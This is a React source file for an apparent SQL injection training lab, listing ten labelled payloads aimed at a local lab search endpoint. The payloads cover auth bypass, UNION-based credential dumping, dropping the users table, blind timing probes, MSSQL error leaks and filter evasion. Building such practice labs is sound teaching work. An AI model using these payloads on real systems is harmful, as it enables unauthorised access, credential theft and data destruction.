import { GenericLab } from "./lab-generic";

const SQLI_PAYLOADS = [
  { id: 101, label: "Auth Bypass Classic", payload: `' OR '1'='1`, desc: "Classic OR-based auth bypass — returns all rows.", bypass: false },
  { id: 102, label: "Comment Termination", payload: `' OR 1=1--`, desc: "Closes the string then injects OR TRUE, comments out the rest.", bypass: false },
  { id: 103, label: "Login Bypass", payload: `admin'--`, desc: "Logs in as admin by commenting out the password check.", bypass: false },
  { id: 104, label: "UNION Probe (3 cols)", payload: `' UNION SELECT NULL,NULL,NULL--`, desc: "Probes for UNION-based injection with 3 columns.", bypass: false },
  { id: 105, label: "Credential Dump", payload: `' UNION SELECT username,password,NULL FROM users--`, desc: "Dumps credentials from the users table via UNION.", bypass: false },
  { id: 106, label: "Drop Table", payload: `'; DROP TABLE users--`, desc: "Classic Bobby Tables — drops the users table.", bypass: false },
  { id: 107, label: "Time-based Blind", payload: `' AND SLEEP(5)--`, desc: "Causes a 5-second delay — confirms blind SQLi without visible output.", bypass: false },
  { id: 108, label: "MSSQL Error-based", payload: `' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--`, desc: "Forces a type conversion error to leak table names on MSSQL.", bypass: false },
  { id: 109, label: "URL-encoded Bypass", payload: `%27%20OR%20%271%27%3D%271`, desc: "URL-encodes the payload to bypass simple string filters.", bypass: true },
  { id: 110, label: "MySQL Comment Bypass", payload: `' /*!UNION*/ /*!SELECT*/ NULL--`, desc: "Uses MySQL-specific inline comments to bypass keyword filters.", bypass: true },
];

export default function LabSqli() {
  return (
    <GenericLab
      title="SQL Injection"
      code="SQLi"
      targetUrl="/api/lab/sqli/search"
      queryParam="q"
      payloads={SQLI_PAYLOADS}
      hint="Inject into the search parameter. Try ' OR 1=1-- to dump all users."
    />
  );
}
